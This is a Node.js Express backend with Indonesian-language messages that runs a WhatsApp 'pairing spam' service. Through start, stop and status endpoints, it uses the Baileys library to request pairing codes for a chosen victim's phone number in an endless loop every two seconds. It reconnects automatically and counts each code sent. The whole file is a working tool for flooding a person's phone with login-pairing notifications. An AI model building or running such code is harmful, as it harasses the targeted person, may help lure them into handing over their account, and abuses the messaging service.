const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const PORT = 3000;
const SESSION_DIR = './sessions';
const PAIRING_DELAY = 2000;

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

let activeSpams = {};

// START
app.post('/api/spam/pairing/start', async (req, res) => {
    const { target, chatId } = req.body;
    if (!target || target.length < 10) return res.status(400).json({ error: 'Nomor tidak valid!' });
    const phone = target.replace(/[+\s-]/g, '');
    if (activeSpams[chatId] && activeSpams[chatId].running) {
        return res.status(400).json({ error: 'Spam sudah berjalan!' });
    }
    activeSpams[chatId] = {
        target: phone,
        running: true,
        count: 0,
        startTime: Date.now(),
        sessionDir: path.join(SESSION_DIR, `session_${chatId}`)
    };
    runSpam(chatId, phone);
    res.json({ status: 'started', message: `Spam pairing ke ${phone} dimulai!` });
});

// STOP
app.post('/api/spam/pairing/stop', (req, res) => {
    const { chatId } = req.body;
    if (activeSpams[chatId]) {
        activeSpams[chatId].running = false;
        return res.json({ status: 'stopped', message: 'Spam dihentikan!' });
    }
    res.status(404).json({ error: 'Tidak ada proses!' });
});

// STATUS
app.get('/api/spam/pairing/status/:chatId', (req, res) => {
    const chatId = req.params.chatId;
    if (activeSpams[chatId]) {
        const data = activeSpams[chatId];
        return res.json({
            running: data.running,
            target: data.target,
            count: data.count,
            duration: Math.floor((Date.now() - data.startTime) / 1000)
        });
    }
    res.json({ running: false });
});

// ENGINE
async function runSpam(chatId, target) {
    const state = activeSpams[chatId];
    if (!state) return;
    try {
        const sessionDir = state.sessionDir;
        const { state: authState, saveCreds } = await useMultiFileAuthState(sessionDir);
        const sock = makeWASocket({
            auth: authState,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: true,
            browser: ['Chrome', 'Windows', '120.0.0.0']
        });
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect && state.running) {
                    setTimeout(() => runSpam(chatId, target), 3000);
                } else {
                    state.running = false;
                }
                return;
            }
            if (connection === 'open') {
                console.log(`[${chatId}] ✅ Connected`);
                while (state.running) {
                    try {
                        const code = await sock.requestPairingCode(target);
                        state.count++;
                        const formatted = code.match(/.{1,4}/g).join('-');
                        console.log(`[${chatId}] #${state.count}: ${formatted}`);
                        await new Promise(r => setTimeout(r, PAIRING_DELAY));
                    } catch (err) {
                        console.log(`[${chatId}] Error: ${err.message}`);
                        await new Promise(r => setTimeout(r, 3000));
                    }
                }
            }
        });
        sock.ev.on('creds.update', saveCreds);
    } catch (err) {
        console.log(`[${chatId}] Init error: ${err.message}`);
        state.running = false;
    }
}

app.listen(PORT, () => {
    console.log(`\n✅ PAIRING SPAM BACKEND RUNNING ON PORT ${PORT}`);
    console.log(`📁 Session dir: ${SESSION_DIR}`);
    console.log(`⏱️  Delay: ${PAIRING_DELAY}ms\n`);
});